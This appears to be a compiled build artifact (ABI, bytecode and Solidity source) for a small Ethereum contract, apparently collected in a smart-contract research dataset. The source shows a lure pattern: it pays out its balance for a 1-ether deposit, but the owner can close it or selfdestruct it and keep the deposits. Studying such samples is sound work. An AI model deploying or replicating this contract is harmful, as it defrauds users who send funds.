{
  "contractName": "y1933Tam",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "assignOwner",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "F",
          "type": "bool"
        }
      ],
      "name": "close",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "end",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "get",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260008060146101000a81548160ff02191690831515021790555034801561002a57600080fd5b506102db8061003a6000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063212c5fea146100645780636d4ce63c14610093578063bc4a414f1461009d578063efbe1c1c146100a7575b005b34801561007057600080fd5b506100916004803603810190808035151590602001909291905050506100be565b005b61009b610131565b005b6100a56101bc565b005b3480156100b357600080fd5b506100bc61023f565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561012e5780600060146101000a81548160ff0219169083151502179055505b50565b670de0b6b3a764000034101580156101565750600060149054906101000a900460ff16155b156101ba573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156101b8573d6000803e3d6000fd5b505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166000141561023d57336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156102ad573373ffffffffffffffffffffffffffffffffffffffff16ff5b5600a165627a7a723058205090d60ba1dac4240095e8a25012dd0266f97d48cf5206929ba8d0c942be9f800029",
  "source": "\n\ncontract y1933Tam {\n    address Owner;\n    bool closed = false;\n\n    function() public payable {}\n\n    function assignOwner() public payable {\n        if (0==Owner) Owner=msg.sender;\n    }\n    function close(bool F) public {\n        if (msg.sender==Owner) closed=F;\n    }\n    function end() public {\n            if (msg.sender==Owner) selfdestruct(msg.sender);\n    }\n    function get() public payable {\n        if (msg.value>=1 ether && !closed) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x19923eadf80ab042c0b0928aaf8b395d4269bbeb/contracts/0x19923eadf80ab042c0b0928aaf8b395d4269bbeb.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:48:42.016Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}